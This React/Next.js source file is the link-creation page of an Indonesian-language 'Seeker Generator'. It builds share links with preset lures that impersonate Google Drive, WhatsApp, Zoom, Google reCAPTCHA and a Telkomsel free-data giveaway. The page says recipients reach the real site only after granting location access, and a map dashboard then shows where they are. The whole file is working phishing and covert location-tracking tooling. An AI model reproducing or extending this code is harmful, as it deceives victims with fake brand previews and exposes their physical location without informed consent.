'use client';

import { useState } from 'react';
import Link from 'next/link';
import QRCode from 'qrcode';
import {
  ShieldCheck,
  Copy,
  Check,
  QrCode,
  Clock,
  PlusCircle,
  ArrowRight,
  ExternalLink,
  RefreshCw,
  Globe,
  FileText,
  MessageSquare,
  Video,
  CheckSquare
} from 'lucide-react';
import { formatTimeRemaining } from '@/lib/utils';
import { LocationSession, TemplateType } from '@/types';

export default function CreateDashboardPage() {
  const [templateType, setTemplateType] = useState<TemplateType>('custom');

  // Custom Link Preview fields matching Seeker CLI inputs!
  const [targetUrl, setTargetUrl] = useState('https://www.telkomsel.com/');
  const [siteName, setSiteName] = useState('Telkomsel.COM');
  const [title, setTitle] = useState('Telkomsel bagi bagi hadiah');
  const [imageUrl, setImageUrl] = useState('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=600&auto=format&fit=crop&q=60');
  const [description, setDescription] = useState('Telkomsel bagi bagi hadiah kuota internet gratis');

  const [expirationMinutes, setExpirationMinutes] = useState(60);
  const [customMinutes, setCustomMinutes] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [createdSession, setCreatedSession] = useState<{
    session: LocationSession;
    shareUrl: string;
    dashboardUrl: string;
  } | null>(null);

  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [copied, setCopied] = useState(false);

  const handleTemplateSelect = (type: TemplateType) => {
    setTemplateType(type);
    if (type === 'gdrive') {
      setTitle('Dokumen_Laporan_Keuangan_2026.pdf');
      setSiteName('Google Drive');
      setDescription('1 file dibagikan dengan Anda - Google Drive Storage');
      setTargetUrl('https://drive.google.com');
      setImageUrl('https://images.unsplash.com/photo-1568667256549-094345857637?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'whatsapp') {
      setTitle('Undangan Grup WhatsApp Alumni');
      setSiteName('WhatsApp Group Invite');
      setDescription('Klik untuk bergabung ke grup perbincangan WhatsApp');
      setTargetUrl('https://whatsapp.com');
      setImageUrl('https://images.unsplash.com/photo-1614680376593-902f749f7cfc?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'zoom') {
      setTitle('Undangan Rapat Online Zoom Meeting');
      setSiteName('Zoom Video Communications');
      setDescription('Klik untuk masuk ke dalam ruang rapat Zoom');
      setTargetUrl('https://zoom.us');
      setImageUrl('https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'recaptcha') {
      setTitle('Verifikasi Keamanan Google ReCAPTCHA');
      setSiteName('Google Security Check');
      setDescription('Selesaikan verifikasi untuk melanjutkan akses situs');
      setTargetUrl('https://google.com');
      setImageUrl('');
    }
  };

  const handleCreateSession = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    const minutes = expirationMinutes === 0 ? parseInt(customMinutes, 10) : expirationMinutes;

    if (!minutes || isNaN(minutes) || minutes < 1) {
      setError('Harap masukkan durasi waktu kedaluwarsa yang valid.');
      setLoading(false);
      return;
    }

    try {
      const res = await fetch('/api/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: title.trim() || 'Link Preview Sharing',
          templateType,
          targetUrl: targetUrl.trim(),
          siteName: siteName.trim(),
          imageUrl: imageUrl.trim(),
          description: description.trim(),
          expirationMinutes: minutes
        })
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || 'Gagal membuat sesi.');
      }

      setCreatedSession(data);

      const qr = await QRCode.toDataURL(data.shareUrl, {
        margin: 2,
        width: 250,
        color: {
          dark: '#0f172a',
          light: '#ffffff'
        }
      });
      setQrCodeDataUrl(qr);
    } catch (err: any) {
      setError(err.message || 'Terjadi kesalahan');
    } finally {
      setLoading(false);
    }
  };

  const handleCopyLink = () => {
    if (!createdSession) return;
    navigator.clipboard.writeText(createdSession.shareUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col font-sans">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
          <Link href="/" className="flex items-center space-x-3">
            <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white font-bold text-sm">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <span className="font-bold text-base text-slate-900 tracking-tight">
              Pembuat Tautan Preview
            </span>
          </Link>
          <Link
            href="/"
            className="text-xs font-medium text-slate-600 hover:text-slate-900 transition-colors"
          >
            ← Kembali ke Beranda
          </Link>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-3xl mx-auto w-full px-6 py-8 flex-1">
        <div className="mb-6">
          <h1 className="text-2xl font-bold text-slate-900">Buat Tautan Custom Preview (Seeker Generator)</h1>
          <p className="text-xs text-slate-600 mt-1">
            Pilih template atau masukkan Target Website URL (seperti Telkomsel, Google Drive, WhatsApp) yang akan dibuka penerima setelah izin lokasi disetujui.
          </p>
        </div>

        {!createdSession ? (
          /* Form Card */
          <div className="p-6 sm:p-8 rounded-xl bg-white border border-slate-200 shadow-sm space-y-6">
            <form onSubmit={handleCreateSession} className="space-y-6">
              {error && (
                <div className="p-3.5 rounded-lg bg-red-50 border border-red-200 text-red-700 text-xs font-medium">
                  {error}
                </div>
              )}

              {/* Template Selection Grid */}
              <div>
                <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                  Pilih Template Tautan Preview
                </label>
                <div className="grid grid-cols-2 sm:grid-cols-5 gap-2.5">
                  {[
                    { id: 'custom', label: 'Custom Link', icon: <Globe className="w-4 h-4 text-blue-600" /> },
                    { id: 'gdrive', label: 'Google Drive', icon: <FileText className="w-4 h-4 text-emerald-600" /> },
                    { id: 'whatsapp', label: 'WhatsApp', icon: <MessageSquare className="w-4 h-4 text-green-600" /> },
                    { id: 'zoom', label: 'Zoom Meeting', icon: <Video className="w-4 h-4 text-indigo-600" /> },
                    { id: 'recaptcha', label: 'ReCaptcha', icon: <CheckSquare className="w-4 h-4 text-amber-600" /> },
                  ].map((t) => (
                    <button
                      key={t.id}
                      type="button"
                      onClick={() => handleTemplateSelect(t.id as TemplateType)}
                      className={`p-3 rounded-lg border text-xs font-medium flex flex-col items-center justify-center space-y-1.5 transition-all ${
                        templateType === t.id
                          ? 'bg-blue-50 border-blue-600 text-blue-700 font-semibold shadow-sm'
                          : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                      }`}
                    >
                      {t.icon}
                      <span>{t.label}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Dynamic Form Inputs matching Seeker CLI! */}
              <div className="p-5 rounded-lg bg-slate-50 border border-slate-200 space-y-4">
                <h3 className="text-xs font-bold uppercase text-slate-700 tracking-wider">
                  Konfigurasi Preview Website Tujuan (Target URL)
                </h3>

                {/* Target URL */}
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">
                    Enter Target URL (Website yang dibuka setelah disetujui)
                  </label>
                  <input
                    type="url"
                    placeholder="https://www.telkomsel.com/"
                    value={targetUrl}
                    onChange={(e) => setTargetUrl(e.target.value)}
                    required
                    className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs font-mono focus:outline-none focus:border-blue-600"
                  />
                </div>

                {/* Site Name & Title */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 mb-1">
                      Site Name (Nama Situs)
                    </label>
                    <input
                      type="text"
                      placeholder="Telkomsel.COM"
                      value={siteName}
                      onChange={(e) => setSiteName(e.target.value)}
                      className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 mb-1">
                      Title (Judul Tautan / Banner)
                    </label>
                    <input
                      type="text"
                      placeholder="Telkomsel bagi bagi hadiah"
                      value={title}
                      onChange={(e) => setTitle(e.target.value)}
                      required
                      className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                    />
                  </div>
                </div>

                {/* Image URL & Description */}
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">
                    Image URL (URL Gambar Banner Preview)
                  </label>
                  <input
                    type="text"
                    placeholder="https://gagatekno.id/wp-content/uploads/.../banner.jpg"
                    value={imageUrl}
                    onChange={(e) => setImageUrl(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs font-mono focus:outline-none focus:border-blue-600"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">
                    Description (Deskripsi Singkat)
                  </label>
                  <textarea
                    rows={2}
                    placeholder="Telkomsel bagi bagi hadiah promo kuota internet"
                    value={description}
                    onChange={(e) => setDescription(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                  />
                </div>
              </div>

              {/* Expiration Options */}
              <div>
                <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                  Batas Waktu Berlaku Tautan
                </label>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                  {[
                    { label: '15 Menit', mins: 15 },
                    { label: '1 Jam', mins: 60 },
                    { label: '24 Jam', mins: 1440 },
                    { label: 'Kustom', mins: 0 }
                  ].map((item) => (
                    <button
                      key={item.label}
                      type="button"
                      onClick={() => setExpirationMinutes(item.mins)}
                      className={`px-3.5 py-2 rounded-lg border text-xs font-medium transition-all ${
                        expirationMinutes === item.mins
                          ? 'bg-blue-50 border-blue-600 text-blue-700 font-semibold shadow-sm'
                          : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                      }`}
                    >
                      {item.label}
                    </button>
                  ))}
                </div>

                {expirationMinutes === 0 && (
                  <div className="mt-3">
                    <input
                      type="number"
                      placeholder="Masukkan durasi dalam menit (contoh: 45)"
                      value={customMinutes}
                      onChange={(e) => setCustomMinutes(e.target.value)}
                      min={1}
                      max={10080}
                      className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                    />
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3.5 rounded-lg bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-semibold text-sm shadow-sm transition-colors flex items-center justify-center space-x-2"
              >
                {loading ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    <span>Membuat Tautan Preview...</span>
                  </>
                ) : (
                  <>
                    <PlusCircle className="w-4 h-4" />
                    <span>Buat Tautan Custom Link</span>
                  </>
                )}
              </button>
            </form>
          </div>
        ) : (
          /* Result Card */
          <div className="space-y-6">
            <div className="p-6 sm:p-8 rounded-xl bg-white border border-slate-200 shadow-sm space-y-6">
              <div className="flex items-center justify-between pb-4 border-b border-slate-200">
                <div>
                  <span className="text-xs text-blue-600 font-semibold uppercase tracking-wider">
                    Tautan Preview Berhasil Dibuat
                  </span>
                  <h2 className="text-xl font-bold text-slate-900 mt-0.5">
                    {createdSession.session.title}
                  </h2>
                  <p className="text-xs text-slate-500 font-mono mt-0.5">
                    Target Redirect: {createdSession.session.target_url || 'N/A'}
                  </p>
                </div>
                <span className="px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-700 text-xs font-semibold">
                  Aktif
                </span>
              </div>

              {/* Share URL Box */}
              <div>
                <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                  Tautan Bagikan (Share Link ke Target)
                </label>
                <div className="flex items-center space-x-2 bg-slate-50 p-2 rounded-lg border border-slate-200">
                  <input
                    type="text"
                    readOnly
                    value={createdSession.shareUrl}
                    className="bg-transparent text-xs text-slate-800 px-2 py-1.5 flex-1 focus:outline-none font-mono"
                  />
                  <button
                    onClick={handleCopyLink}
                    className="px-4 py-2 rounded-md bg-blue-600 hover:bg-blue-700 text-white text-xs font-medium flex items-center space-x-1.5 transition-colors shadow-sm"
                  >
                    {copied ? (
                      <>
                        <Check className="w-3.5 h-3.5" />
                        <span>Tersalin!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Salin Link</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* QR Code & Expiration */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
                <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 flex flex-col items-center justify-center text-center">
                  <div className="w-8 h-8 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center mb-2">
                    <QrCode className="w-4 h-4" />
                  </div>
                  <span className="text-xs font-medium text-slate-700 mb-2">Pindai QR Kode Tautan</span>
                  {qrCodeDataUrl && (
                    <img
                      src={qrCodeDataUrl}
                      alt="QR Code Sesi"
                      className="w-40 h-40 rounded-lg border border-slate-200 bg-white p-2 shadow-sm"
                    />
                  )}
                </div>

                <div className="p-5 rounded-lg bg-slate-50 border border-slate-200 flex flex-col justify-between space-y-4">
                  <div>
                    <div className="flex items-center space-x-2 text-slate-700 text-xs font-semibold mb-1">
                      <Clock className="w-4 h-4 text-blue-600" />
                      <span>Sisa Waktu Berlaku</span>
                    </div>
                    <p className="text-xl font-bold text-slate-900">
                      {formatTimeRemaining(createdSession.session.expires_at)}
                    </p>
                    <p className="text-xs text-slate-500 mt-1">
                      Kedaluwarsa pada: {new Date(createdSession.session.expires_at).toLocaleString()}
                    </p>
                  </div>

                  <div className="pt-4 border-t border-slate-200 space-y-2">
                    <Link
                      href={`/dashboard/${createdSession.session.id}`}
                      className="w-full py-2.5 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs flex items-center justify-center space-x-2 transition-colors shadow-sm"
                    >
                      <span>Buka Dashboard Pemantau Peta</span>
                      <ArrowRight className="w-3.5 h-3.5" />
                    </Link>
                    <a
                      href={createdSession.shareUrl}
                      target="_blank"
                      rel="noreferrer"
                      className="w-full py-2 rounded-lg bg-white border border-slate-300 hover:bg-slate-100 text-slate-700 font-medium text-xs flex items-center justify-center space-x-2 transition-colors"
                    >
                      <span>Uji Halaman Preview Penerima</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </a>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex justify-center">
              <button
                onClick={() => setCreatedSession(null)}
                className="text-xs font-medium text-slate-600 hover:text-slate-900 transition-colors"
              >
                + Buat Tautan Custom Link Lainnya
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
